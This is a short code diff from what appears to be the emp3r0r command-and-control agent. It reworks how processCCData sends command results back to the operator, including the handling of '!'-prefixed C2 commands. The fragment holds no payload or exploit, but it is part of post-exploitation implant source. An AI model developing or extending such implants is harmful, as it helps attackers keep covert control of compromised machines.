@@ -56,11 +56,11 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 			log.Println(err)
 		}
 	}
-	out = fmt.Sprintf("Command %v failed to run", cmdSlice)
-	defer sendResponse(out)
+	out = "Command failed"
 
 	if strings.HasPrefix(cmdSlice[0], "!") {
 		out = C2CommandsHandler(cmdSlice)
+		sendResponse(out)
 		return
 	}
 
@@ -294,4 +294,5 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 				cmdSlice, cmd.Process.Pid)
 		}
 	}
+	defer sendResponse(out)
 }
